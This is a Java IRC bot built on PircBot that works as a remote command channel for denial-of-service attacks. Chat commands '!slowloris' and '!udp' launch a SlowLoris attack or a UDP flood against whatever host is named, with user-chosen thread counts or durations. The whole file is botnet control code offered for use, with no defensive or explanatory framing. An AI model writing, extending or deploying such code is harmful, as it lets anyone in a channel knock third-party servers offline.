import com.sun.org.apache.xpath.internal.operations.Number;
import org.apache.commons.lang3.math.NumberUtils;
import org.jibble.pircbot.PircBot;


public class Bot extends PircBot
{
    private static final String PREFIX = "!"; //prefix für commands -> !test


    public Bot(String nick)
    {
        this.setName(nick);
    }

    public void onMessage(String channel, String sender, String login, String hostname, String message)
    {
        if(message.equalsIgnoreCase(PREFIX+"test"))
        {
            sendMessage(channel, "Hallo");
        }
        if(message.toLowerCase().contains(PREFIX+"slowloris"))
        {
            String[] args = message.split(" ");
            if(args.length <= 1)
            {
                sendMessage(channel, SlowLoris.printHelp());
                return;
            }
            if(NumberUtils.isDigits(args[2]) && NumberUtils.isDigits(args[3]))
            {
                sendMessage(channel, "Starting SlowLoris Attack on " + args[1] + " with " + args[2] + " threads, and " + args[3] + " resends per thread");
                try
                {
                    new SlowLoris(args[1],Integer.parseInt(args[2]),Integer.parseInt(args[3]));
                }
                catch (Exception e)
                {
                    sendMessage(channel, "Unable to Resolve hostname "+args[1]+". Shutting down Attack");
                }
            }
            else
            {
                sendMessage(channel, SlowLoris.printHelp());
            }
        }
        if(message.toLowerCase().contains(PREFIX+"udp"))
        {
            String[] args = message.split(" ");
            if(args.length <= 1)
            {
                sendMessage(channel, UDPFlood.printHelp());
            }
            if(NumberUtils.isDigits(args[2]))
            {
                sendMessage(channel, "Starting UDPFlood on "+args[1]+", "+args[2]+" seconds");
                try
                {
                    new UDPFlood(args[1], Long.parseLong(args[2]));
                }
                catch(Exception e)
                {

                }
            }

        }
    }




}
